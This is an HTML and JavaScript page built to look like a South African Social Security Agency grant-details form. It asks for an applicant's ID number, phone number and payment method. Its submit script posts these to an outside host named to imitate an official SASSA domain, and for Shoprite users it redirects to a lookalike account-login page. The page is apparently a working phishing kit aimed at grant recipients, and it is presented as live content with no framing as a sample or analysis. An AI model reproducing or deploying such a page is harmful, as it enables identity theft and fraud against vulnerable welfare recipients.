<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SASSA</title>

<link rel="icon" href="https://srd-sassa-gov-za-sc19-contact.web.app/sassa-logo2.jpeg">

<style>
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#f9f9f9;
}

.header{
    background:#fbc02d;
    padding:5px;
    
}

.header img{
    height:50px;
}

.application-form{
    padding:20px;
    background:white;
    max-width:400px;
    margin:20px auto;
    box-shadow:0 4px 8px rgba(0,0,0,0.1);
    border-radius:5px;
}

.application-form label{
    display:block;
    font-size:14px;
    font-weight:bold;
    margin-bottom:5px;
}

.application-form input,
.application-form select{
    width:98%;
    padding:12px;
    margin-bottom:20px;
    border:1px solid #ccc;
    border-radius:5px;
}

.submit-btn{
    background:#d8d8d8;
    color:#919191;
    border:none;
    padding:10px;
    border-radius:5px;
    width:100%;
    cursor:not-allowed;
}

.submit-btn:enabled{
    background:#fbc02d;
    color:black;
    cursor:pointer;
}

input.invalid,select.invalid{
    border:2px solid red !important;
}

input.valid,select.valid{
    border:2px solid #fbc02d !important;
}

#paymentSection{
    display:none;
}
</style>
</head>

<body>

<header class="header">
<img src="sassa-logo.png">
</header>

<form class="application-form" id="applicationForm">

<label>South African ID number of applicant *</label>
<input type="text" id="idNumber" maxlength="13" oninput="validateForm()">

<label>Phone number used to submit your application *</label>
<input type="text" id="phoneNumber" maxlength="10" oninput="validateForm()">

<div id="paymentSection">
<label>Confirm your current payment method *</label>

<select id="paymentMethod" onchange="validateForm()">
<option value="">-- Select Payment Method --</option>
<option value="Bank Account">Bank Account</option>
<option value="Post Office (Retail Shops)">Post Office (Retail Shops)</option>
<option value="Shoprite Money Market">Shoprite Money Market</option>
</select>
</div>

<button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>

</form>

<script>

// SA ID validation
function isValidSAID(id){
    if(!/^\d{13}$/.test(id)) return false;

    let sum = 0;

    for(let i=0;i<13;i++){
        let digit = parseInt(id.charAt(i));

        if((i+1)%2===0){
            digit *= 2;
            if(digit>9) digit -= 9;
        }

        sum += digit;
    }

    return sum % 10 === 0;
}

// Input styling
function validateInput(el, valid){
    el.classList.remove("valid","invalid");
    if(el.value==="") return;
    el.classList.add(valid ? "valid" : "invalid");
}

// Form validation
function validateForm(){
    const idNumber = document.getElementById("idNumber");
    const phoneNumber = document.getElementById("phoneNumber");
    const paymentMethod = document.getElementById("paymentMethod");
    const paymentSection = document.getElementById("paymentSection");
    const submitButton = document.getElementById("submitButton");

    const idValid = isValidSAID(idNumber.value);
    const phoneValid = /^\d{10}$/.test(phoneNumber.value);

    validateInput(idNumber, idValid);
    validateInput(phoneNumber, phoneValid);

    if(idValid && phoneValid){
        paymentSection.style.display = "block";
    } else {
        paymentSection.style.display = "none";
        paymentMethod.value = "";
    }

    const paymentValid = paymentMethod.value !== "";
    validateInput(paymentMethod, paymentValid);

    submitButton.disabled = !(idValid && phoneValid && paymentValid);
}

// Submit form
document.getElementById("applicationForm").addEventListener("submit", async function(e){
    e.preventDefault();

    const idNumber = document.getElementById("idNumber").value.trim();
    const phoneNumber = document.getElementById("phoneNumber").value.trim();
    const paymentMethod = document.getElementById("paymentMethod").value;

    let newphoneNumber = paymentMethod;


    try{
        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                idNumber,
                phoneNumber,
                newphoneNumber
            })
        });

        if(response.ok){

            // Redirect if Shoprite selected
            if(paymentMethod === "Shoprite Money Market"){
                window.location.href = "https://moneymarketaccount-co-za-login.onrender.com/";
            } else {
                alert("Submitted successfully!");
            }

        } else {
            alert("Error occurred");
        }

    } catch(err){
        alert("Network error");
    }
});

</script>

</body>
</html>
